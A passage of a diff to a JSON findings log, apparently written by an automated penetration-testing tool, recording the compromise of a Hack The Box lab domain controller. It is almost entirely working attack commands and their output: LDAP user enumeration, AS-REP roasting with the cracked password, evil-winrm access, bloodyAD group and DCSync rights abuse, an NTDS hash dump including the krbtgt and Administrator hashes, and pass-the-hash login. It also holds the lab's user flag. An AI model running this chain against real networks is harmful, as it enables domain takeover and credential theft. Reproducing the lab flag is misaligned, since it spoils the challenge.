+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "port:88",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 88,
+          "protocol": "tcp",
+          "service": "kerberos-sec",
+          "version": "Microsoft Windows Kerberos (server time: 2026-10-11 17:56:23Z)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "service.kerberos-sec",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 88,
+          "protocol": "tcp",
+          "service": "kerberos-sec",
+          "version": "Microsoft Windows Kerberos (server time: 2026-10-11 17:56:23Z)"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.526
+      },
+      {
+        "kind": "blocker.access_denied",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "tool": "exec",
+          "via": "blocker-detect"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "created_at": 1791741371.529
+      },
+      {
+        "kind": "ad.dc_candidate",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "host": "10.129.105.202",
+          "name": "FOREST",
+          "domain": "htb.local"
+        },
+        "state": "supported",
+        "source": "nxc ldap 10.129.105.202 -u '' -p ''",
+        "created_at": 1791744091.692
+      },
+      {
+        "kind": "ldap.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "tool": "nxc"
+        },
+        "state": "supported",
+        "source": "nxc ldap 10.129.105.202 -u '' -p ''",
+        "created_at": 1791744091.692
+      },
+      {
+        "kind": "ad.anonymous_bind",
+        "scope": "domain:htb.local",
+        "value": {
+          "tool": "nxc"
+        },
+        "state": "supported",
+        "source": "nxc ldap 10.129.105.202 -u '' -p ''",
+        "created_at": 1791744091.692
+      },
+      {
+        "kind": "ad.user_list",
+        "scope": "domain:htb.local",
+        "value": {
+          "users": [
+            "$331000-VK4ADACQNUCA",
+            "Administrator",
+            "andy",
+            "DefaultAccount",
+            "Guest",
+            "HealthMailbox0659cc1",
+            "HealthMailbox670628e",
+            "HealthMailbox6ded678",
+            "HealthMailbox7108a4e",
+            "HealthMailbox83d6781",
+            "HealthMailbox968e74d",
+            "HealthMailboxb01ac64",
+            "HealthMailboxc0a90c9",
+            "HealthMailboxc3d7722",
+            "HealthMailboxfc9daad",
+            "HealthMailboxfd87238",
+            "krbtgt",
+            "lucinda",
+            "mark",
+            "santi",
+            "sebastien",
+            "SM_1b41c9286325456bb",
+            "SM_1ffab36a2f5f479cb",
+            "SM_2c8eef0a09b545acb",
+            "SM_681f53d4942840e18",
+            "SM_75a538d3025e4db9a",
+            "SM_7c96b981967141ebb",
+            "SM_9b69f1b9d2cc45549",
+            "SM_c75ee099d0a64c91b",
+            "SM_ca8c2ed5bdab4dc9b",
+            "svc-alfresco"
+          ],
+          "count": 31
+        },
+        "state": "supported",
+        "source": "nxc ldap 10.129.105.202 -u '' -p '' --users | tee scans/ldap-users.txt",
+        "created_at": 1791744122.779
+      },
+      {
+        "kind": "hash.asrep",
+        "scope": "domain:htb.local",
+        "value": {
+          "hashes": [
+            "$krb5asrep$23$svc-alfresco@HTB.LOCAL:3323ca16c65324c9955aea658f803c82$37e55abf1433bac5d32bb14cb5de39089676e971f77045734ecf5ad1bfd988e86a9e88da6ce14d77620dffc94a428a1d447623323adee68f72d7869e7c80e46c22b91d66c4ba4858afd882bd0f88f81cf08b5e7112ac8b03729050cdf98550886b29fbc4463732d2e1d0baf4851ed7102f2184f6e37974f58c8467b89b211d6a447f62e17649c85a31fda70c58f572e2e594cb41fcbe513b3fbffe535573eff08470424c04b885cb5fe66d9b29e1d25f64ab1e0d5e68b901d1ecc4a71893761d63a2a8f9196ed7b948ef14de062d29d8f31d8b44c7e7e5510417f33968301f44924c68b73565"
+          ],
+          "count": 1
+        },
+        "state": "supported",
+        "source": "nxc ldap 10.129.105.202 -u loot/users.txt -p '' --asreproast loot/asrep.hashes",
+        "created_at": 1791744226.055
+      },
+      {
+        "kind": "credential.candidate",
+        "scope": "domain:htb.local",
+        "value": {
+          "kind": "asrep_hash",
+          "count": 1
+        },
+        "state": "supported",
+        "source": "nxc ldap 10.129.105.202 -u loot/users.txt -p '' --asreproast loot/asrep.hashes",
+        "created_at": 1791744226.055
+      },
+      {
+        "kind": "blocker.access_denied",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "tool": "nxc",
+          "via": "blocker-detect"
+        },
+        "state": "supported",
+        "source": "nxc ldap 10.129.105.202 -u loot/users.txt -p '' --asreproast loot/asrep.hashes",
+        "created_at": 1791744226.056
+      },
+      {
+        "kind": "hash.asrep",
+        "scope": "domain:htb.local",
+        "value": {
+          "hashes": [
+            "$krb5asrep$23$svc-alfresco@HTB.LOCAL:3323ca16c65324...b73565",
+            "$krb5asrep$23$svc-alfresco@HTB.LOCAL:3323ca16c65324c9955aea658f803c82$37e55abf1433bac5d32bb14cb5de39089676e971f77045734ecf5ad1bfd988e86a9e88da6ce14d77620dffc94a428a1d447623323adee68f72d7869e7c80e46c22b91d66c4ba4858afd882bd0f88f81cf08b5e7112ac8b03729050cdf98550886b29fbc4463732d2e1d0baf4851ed7102f2184f6e37974f58c8467b89b211d6a447f62e17649c85a31fda70c58f572e2e594cb41fcbe513b3fbffe535573eff08470424c04b885cb5fe66d9b29e1d25f64ab1e0d5e68b901d1ecc4a71893761d63a2a8f9196ed7b948ef14de062d29d8f31d8b44c7e7e5510417f33968301f44924c68b73565:s3rvice"
+          ],
+          "count": 2
+        },
+        "state": "supported",
+        "source": "hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt",
+        "created_at": 1791745280.935
+      },
+      {
+        "kind": "credential.candidate",
+        "scope": "domain:htb.local",
+        "value": {
+          "kind": "asrep_hash",
+          "count": 2
+        },
+        "state": "supported",
+        "source": "hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt",
+        "created_at": 1791745280.935
+      },
+      {
+        "kind": "credential.plaintext",
+        "scope": "domain:htb.local",
+        "value": {
+          "user": "svc-alfresco",
+          "password": "s3rvice",
+          "method": "hashcat",
+          "domain": "htb.local",
+          "hash_type": "asrep"
+        },
+        "state": "supported",
+        "source": "hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt",
+        "created_at": 1791745280.937
+      },
+      {
+        "kind": "credential.available",
+        "scope": "domain:htb.local",
+        "value": {
+          "user": "svc-alfresco",
+          "password": "s3rvice",
+          "method": "hashcat",
+          "domain": "htb.local",
+          "hash_type": "asrep"
+        },
+        "state": "supported",
+        "source": "hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt",
+        "created_at": 1791745280.937
+      },
+      {
+        "kind": "credential.validated",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "user": "svc-alfresco",
+          "via": "hashcat"
+        },
+        "state": "supported",
+        "source": "hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt",
+        "created_at": 1791745280.937
+      },
+      {
+        "kind": "winrm.authenticated",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "service": "winrm",
+          "tool": "evil-winrm",
+          "user": "svc-alfresco",
+          "password": "s3rvice"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.009
+      },
+      {
+        "kind": "foothold.windows",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "service": "winrm",
+          "tool": "evil-winrm",
+          "user": "svc-alfresco",
+          "password": "s3rvice"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.009
+      },
+      {
+        "kind": "credential.validated",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "user": "svc-alfresco",
+          "service": "winrm"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.009
+      },
+      {
+        "kind": "host.os_hint",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "evil-winrm",
+          "evidence": "evil-winrm authenticated shell"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.009
+      },
+      {
+        "kind": "host.os_family",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "evil-winrm",
+          "evidence": "evil-winrm authenticated shell"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.009
+      },
+      {
+        "kind": "credential.available",
+        "scope": "domain:htb.local",
+        "value": {
+          "user": "svc-alfresco",
+          "service": "winrm",
+          "method": "evil-winrm",
+          "password": "s3rvice"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.009
+      },
+      {
+        "kind": "foothold.windows",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "method": "evil-winrm"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.012
+      },
+      {
+        "kind": "host.os_hint",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "evil-winrm",
+          "evidence": "Windows command execution output"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.012
+      },
+      {
+        "kind": "host.os_family",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "evil-winrm",
+          "evidence": "Windows command execution output"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.012
+      },
+      {
+        "kind": "access.desktop",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "session": "evil-winrm"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.012
+      },
+      {
+        "kind": "objective.local_flag",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "flag": "8bde969a1628a97b4279f3bcc283ac43",
+          "slot": "local",
+          "name": "user.txt",
+          "path": "user.txt"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.017
+      },
+      {
+        "kind": "objective.flag_located",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "slot": "local",
+          "name": "user.txt",
+          "path": "C:\\Users\\svc-alfresco\\Desktop\\user.txt"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.017
+      },
+      {
+        "kind": "scan.local.interfaces",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "interfaces": [
+            {
+              "ip": "10.129.105.202",
+              "cidr": "10.129.105.202/16"
+            }
+          ],
+          "subnets": [
+            "10.129.0.0/16"
+          ]
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.022
+      },
+      {
+        "kind": "scan.local.routes",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "subnets": [
+            "10.129.0.0/16"
+          ]
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u 'svc-alfresco' -p 's3rvice'",
+        "created_at": 1791769352.022
+      },
+      {
+        "kind": "ad.group_joined",
+        "scope": "domain:htb.local",
+        "value": {
+          "group": "Exchange Windows Permissions",
+          "principal": "svc-alfresco",
+          "method": "bloodyad",
+          "evidence": [
+            "[+] svc-alfresco added to Exchange Windows Permissions"
+          ]
+        },
+        "state": "supported",
+        "source": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' get writable --detail | tee scans/bloodyad-writable.txt",
+        "created_at": 1791772163.476
+      },
+      {
+        "kind": "ad.group_joined",
+        "scope": "domain:htb.local",
+        "value": {
+          "group": "Organization Management",
+          "principal": "svc-alfresco",
+          "method": "bloodyad",
+          "evidence": [
+            "[+] svc-alfresco added to Organization Management"
+          ]
+        },
+        "state": "supported",
+        "source": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' get writable --detail | tee scans/bloodyad-writable.txt",
+        "created_at": 1791772163.476
+      },
+      {
+        "kind": "ad.group_joined",
+        "scope": "domain:htb.local",
+        "value": {
+          "group": "Dnsadmins",
+          "principal": "svc-alfresco",
+          "method": "bloodyad",
+          "evidence": [
+            "[+] svc-alfresco added to Dnsadmins"
+          ]
+        },
+        "state": "supported",
+        "source": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' get writable --detail | tee scans/bloodyad-writable.txt",
+        "created_at": 1791772163.476
+      },
+      {
+        "kind": "ad.group_joined",
+        "scope": "domain:htb.local",
+        "value": {
+          "group": "Policy Creator Owners",
+          "principal": "svc-alfresco",
+          "method": "bloodyad",
+          "evidence": [
+            "[+] svc-alfresco added to Group Policy Creator Owners"
+          ]
+        },
+        "state": "supported",
+        "source": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' get writable --detail | tee scans/bloodyad-writable.txt",
+        "created_at": 1791772163.476
+      },
+      {
+        "kind": "ad.group_joined",
+        "scope": "domain:htb.local",
+        "value": {
+          "group": "Group Policy Creator Owners",
+          "principal": "",
+          "method": "bloodyad",
+          "evidence": [
+            "[+] JOINED: Group Policy Creator Owners"
+          ]
+        },
+        "state": "supported",
+        "source": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' get writable --detail | tee scans/bloodyad-writable.txt",
+        "created_at": 1791772163.476
+      },
+      {
+        "kind": "ad.group_joined",
+        "scope": "domain:htb.local",
+        "value": {
+          "group": "Key Admins",
+          "principal": "svc-alfresco",
+          "method": "bloodyad",
+          "evidence": [
+            "[+] svc-alfresco added to Key Admins"
+          ]
+        },
+        "state": "supported",
+        "source": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' get writable --detail | tee scans/bloodyad-writable.txt",
+        "created_at": 1791772163.476
+      },
+      {
+        "kind": "ad.group_joined",
+        "scope": "domain:htb.local",
+        "value": {
+          "group": "Enterprise Key Admins",
+          "principal": "svc-alfresco",
+          "method": "bloodyad",
+          "evidence": [
+            "[+] svc-alfresco added to Enterprise Key Admins"
+          ]
+        },
+        "state": "supported",
+        "source": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' get writable --detail | tee scans/bloodyad-writable.txt",
+        "created_at": 1791772163.476
+      },
+      {
+        "kind": "ad.control_paths",
+        "scope": "domain:htb.local",
+        "value": {
+          "rights": [
+            "DCSync"
+          ],
+          "method": "bloodyad",
+          "evidence": [
+            "└─$ bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' add dcsync svc-alfresco",
+            "[+] svc-alfresco is now able to DCSync"
+          ],
+          "operation": "dcsync_grant"
+        },
+        "state": "supported",
+        "source": "bloodyAD -d htb.local --host 10.129.105.202 -u svc-alfresco -p 's3rvice' add dcsync svc-alfresco",
+        "created_at": 1791772193.68
+      },
+      {
+        "kind": "host.os_hint",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "nxc",
+          "evidence": "SMB         10.129.105.202  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)",
+          "os": "Windows Server 2016 Standard 14393 x64"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.836
+      },
+      {
+        "kind": "host.os_family",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "nxc",
+          "evidence": "SMB         10.129.105.202  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)",
+          "os": "Windows Server 2016 Standard 14393 x64"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.836
+      },
+      {
+        "kind": "smb.signing",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "enabled": true,
+          "tool": "nxc",
+          "flags": []
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.836
+      },
+      {
+        "kind": "smb.smbv1",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "enabled": true,
+          "tool": "nxc"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.836
+      },
+      {
+        "kind": "smb.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "tool": "nxc"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.836
+      },
+      {
+        "kind": "smb.null_session",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "tool": "nxc",
+          "null_auth": true
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.839
+      },
+      {
+        "kind": "credential.available",
+        "scope": "domain:htb.local",
+        "value": {
+          "user": "svc-alfresco",
+          "service": "smb",
+          "method": "nxc",
+          "password": "s3rvice",
+          "domain": "htb.local"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.84
+      },
+      {
+        "kind": "smb.authenticated",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "user": "svc-alfresco",
+          "service": "smb",
+          "method": "nxc",
+          "password": "s3rvice",
+          "domain": "htb.local"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.84
+      },
+      {
+        "kind": "credential.validated",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "user": "svc-alfresco",
+          "service": "smb"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.84
+      },
+      {
+        "kind": "hash.ntlm",
+        "scope": "domain:htb.local",
+        "value": {
+          "count": 33,
+          "entries": [
+            {
+              "user": "Administrator",
+              "rid": 500,
+              "nthash": "32693b11e6aa90eb43d32c72a07ceea6",
+              "domain": "htb.local"
+            },
+            {
+              "user": "Guest",
+              "rid": 501,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": ""
+            },
+            {
+              "user": "krbtgt",
+              "rid": 502,
+              "nthash": "819af826bb148e603acb0f33d17632f8",
+              "domain": ""
+            },
+            {
+              "user": "DefaultAccount",
+              "rid": 503,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": ""
+            },
+            {
+              "user": "$331000-VK4ADACQNUCA",
+              "rid": 1123,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": "htb.local"
+            },
+            {
+              "user": "SM_2c8eef0a09b545acb",
+              "rid": 1124,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": "htb.local"
+            },
+            {
+              "user": "SM_ca8c2ed5bdab4dc9b",
+              "rid": 1125,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": "htb.local"
+            },
+            {
+              "user": "SM_75a538d3025e4db9a",
+              "rid": 1126,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": "htb.local"
+            },
+            {
+              "user": "SM_681f53d4942840e18",
+              "rid": 1127,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": "htb.local"
+            },
+            {
+              "user": "SM_1b41c9286325456bb",
+              "rid": 1128,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": "htb.local"
+            },
+            {
+              "user": "SM_9b69f1b9d2cc45549",
+              "rid": 1129,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": "htb.local"
+            },
+            {
+              "user": "SM_7c96b981967141ebb",
+              "rid": 1130,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": "htb.local"
+            },
+            {
+              "user": "SM_c75ee099d0a64c91b",
+              "rid": 1131,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": "htb.local"
+            },
+            {
+              "user": "SM_1ffab36a2f5f479cb",
+              "rid": 1132,
+              "nthash": "31d6cfe0d16ae931b73c59d7e0c089c0",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailboxc3d7722",
+              "rid": 1134,
+              "nthash": "4761b9904a3d88c9c9341ed081b4ec6f",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailboxfc9daad",
+              "rid": 1135,
+              "nthash": "5e89fd2c745d7de396a0152f0e130f44",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailboxc0a90c9",
+              "rid": 1136,
+              "nthash": "3b4ca7bcda9485fa39616888b9d43f05",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailbox670628e",
+              "rid": 1137,
+              "nthash": "e364467872c4b4d1aad555a9e62bc88a",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailbox968e74d",
+              "rid": 1138,
+              "nthash": "ca4f125b226a0adb0a4b1b39b7cd63a9",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailbox6ded678",
+              "rid": 1139,
+              "nthash": "c5b934f77c3424195ed0adfaae47f555",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailbox83d6781",
+              "rid": 1140,
+              "nthash": "9e8b2242038d28f141cc47ef932ccdf5",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailboxfd87238",
+              "rid": 1141,
+              "nthash": "f2fa616eae0d0546fc43b768f7c9eeff",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailboxb01ac64",
+              "rid": 1142,
+              "nthash": "0d17cfde47abc8cc3c58dc2154657203",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailbox7108a4e",
+              "rid": 1143,
+              "nthash": "d7baeec71c5108ff181eb9ba9b60c355",
+              "domain": "htb.local"
+            },
+            {
+              "user": "HealthMailbox0659cc1",
+              "rid": 1144,
+              "nthash": "900a4884e1ed00dd6e36872859c03536",
+              "domain": "htb.local"
+            },
+            {
+              "user": "sebastien",
+              "rid": 1145,
+              "nthash": "96246d980e3a8ceacbf9069173fa06fc",
+              "domain": "htb.local"
+            },
+            {
+              "user": "lucinda",
+              "rid": 1146,
+              "nthash": "4c2af4b2cd8a15b1ebd0ef6c58b879c3",
+              "domain": "htb.local"
+            },
+            {
+              "user": "svc-alfresco",
+              "rid": 1147,
+              "nthash": "9248997e4ef68ca2bb47ae4e6f128668",
+              "domain": "htb.local"
+            },
+            {
+              "user": "andy",
+              "rid": 1150,
+              "nthash": "29dfccaf39618ff101de5165b19d524b",
+              "domain": "htb.local"
+            },
+            {
+              "user": "mark",
+              "rid": 1151,
+              "nthash": "9e63ebcb217bf3c6b27056fdcb6150f7",
+              "domain": "htb.local"
+            },
+            {
+              "user": "santi",
+              "rid": 1152,
+              "nthash": "483d4c70248510d8e0acb6066cd89072",
+              "domain": "htb.local"
+            },
+            {
+              "user": "FOREST$",
+              "rid": 1000,
+              "nthash": "9c8e0ea7b5039703fa9819a721b40cd0",
+              "domain": ""
+            },
+            {
+              "user": "EXCH01$",
+              "rid": 1103,
+              "nthash": "050105bb043f5b8ffc3a9fa99b5ef7c1",
+              "domain": ""
+            }
+          ]
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.841
+      },
+      {
+        "kind": "credential.candidate",
+        "scope": "domain:htb.local",
+        "value": {
+          "kind": "ntlm_hash",
+          "count": 33
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.841
+      },
+      {
+        "kind": "hash.krbtgt",
+        "scope": "domain:htb.local",
+        "value": {
+          "nthash": "819af826bb148e603acb0f33d17632f8"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.841
+      },
+      {
+        "kind": "loot.ntds",
+        "scope": "domain:htb.local",
+        "value": {
+          "count": 33,
+          "method": "credential-dump"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.841
+      },
+      {
+        "kind": "credential.available",
+        "scope": "domain:htb.local",
+        "value": {
+          "user": "Administrator",
+          "nthash": "32693b11e6aa90eb43d32c72a07ceea6",
+          "method": "dcsync",
+          "hash_type": "ntlm",
+          "domain": "htb.local"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.841
+      },
+      {
+        "kind": "credential.admin",
+        "scope": "domain:htb.local",
+        "value": {
+          "user": "Administrator",
+          "nthash": "32693b11e6aa90eb43d32c72a07ceea6",
+          "method": "dcsync",
+          "hash_type": "ntlm",
+          "domain": "htb.local"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.841
+      },
+      {
+        "kind": "access.admin",
+        "scope": "domain:htb.local",
+        "value": {
+          "user": "Administrator",
+          "nthash": "32693b11e6aa90eb43d32c72a07ceea6",
+          "method": "dcsync",
+          "hash_type": "ntlm",
+          "domain": "htb.local"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u svc-alfresco -p 's3rvice' --ntds",
+        "created_at": 1791772409.841
+      },
+      {
+        "kind": "winrm.authenticated",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "service": "winrm",
+          "tool": "evil-winrm",
+          "user": "Administrator",
+          "nthash": "32693b11e6aa90eb43d32c72a07ceea6"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6",
+        "created_at": 1791773947.694
+      },
+      {
+        "kind": "foothold.windows",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "service": "winrm",
+          "tool": "evil-winrm",
+          "user": "Administrator",
+          "nthash": "32693b11e6aa90eb43d32c72a07ceea6"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6",
+        "created_at": 1791773947.694
+      },
+      {
+        "kind": "credential.validated",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "user": "Administrator",
+          "service": "winrm"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6",
+        "created_at": 1791773947.694
+      },
+      {
+        "kind": "credential.available",
+        "scope": "domain:htb.local",
+        "value": {
+          "user": "Administrator",
+          "service": "winrm",
+          "method": "pth",
+          "nthash": "32693b11e6aa90eb43d32c72a07ceea6"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6",
+        "created_at": 1791773947.695
+      },
+      {
+        "kind": "objective.flag_located",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "slot": "root",
+          "name": "root.txt",
+          "path": "C:\\Users\\Administrator\\Desktop\\root.txt"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6",
+        "created_at": 1791773947.704
+      },
+      {
+        "kind": "objective.flag_located_root",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "slot": "root",
+          "name": "root.txt",
+          "path": "C:\\Users\\Administrator\\Desktop\\root.txt"
+        },
+        "state": "supported",
+        "source": "evil-winrm -i 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6",
+        "created_at": 1791773947.704
+      },
+      {
+        "kind": "foothold.windows",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "method": "nxc",
+          "identity": "htb\\administrator"
+        },
+        "state": "supported",
